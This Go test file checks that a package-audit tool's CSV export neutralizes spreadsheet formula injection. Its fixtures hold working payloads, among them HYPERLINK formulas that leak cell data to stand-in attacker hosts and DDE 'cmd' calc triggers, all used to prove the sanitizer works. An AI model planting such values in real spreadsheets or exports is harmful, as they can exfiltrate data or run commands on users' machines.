package output

import (
	"encoding/csv"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/projectdiscovery/depx/internal/audit"
)

func TestSanitizeCSVField(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"left-pad", "left-pad"},
		{"=HYPERLINK(\"http://evil/?x=\"&A1)", "'=HYPERLINK(\"http://evil/?x=\"&A1)"},
		{"+1+1", "'+1+1"},
		{"-2+3+cmd|' /C calc'!A0", "'-2+3+cmd|' /C calc'!A0"},
		{"@SUM(1+1)*cmd", "'@SUM(1+1)*cmd"},
		{"\tleading-tab", "'\tleading-tab"},
		{"\rleading-cr", "'\rleading-cr"},
	}
	for _, tc := range cases {
		if got := sanitizeCSVField(tc.in); got != tc.want {
			t.Errorf("sanitizeCSVField(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestWriteAuditCSV_FormulaInjection proves a malicious package whose
// attacker-controlled fields begin with a formula trigger is neutralized in the
// exported CSV so a spreadsheet app will not execute it.
func TestWriteAuditCSV_FormulaInjection(t *testing.T) {
	result := &audit.Result{
		Findings: []audit.Finding{{
			Verdict:   "malicious",
			Ecosystem: "npm",
			Name:      "=cmd|' /C calc'!A0",
			Version:   "1.0.0",
			IDs:       []string{"MAL-2026-0001"},
			Summary:   "=HYPERLINK(\"http://attacker.example/?leak=\"&A1,\"open\")",
		}},
	}

	path := filepath.Join(t.TempDir(), "audit.csv")
	if err := WriteAuditCSV(path, result); err != nil {
		t.Fatalf("WriteAuditCSV: %v", err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	records, err := csv.NewReader(strings.NewReader(string(data))).ReadAll()
	if err != nil {
		t.Fatalf("re-parse CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("got %d records, want header + 1 row", len(records))
	}
	row := records[1]
	// name is column index 2, summary is column index 5 (see auditCSVHeader).
	if got := row[2]; !strings.HasPrefix(got, "'=") {
		t.Errorf("name field not neutralized: %q", got)
	}
	if got := row[5]; !strings.HasPrefix(got, "'=") {
		t.Errorf("summary field not neutralized: %q", got)
	}
}
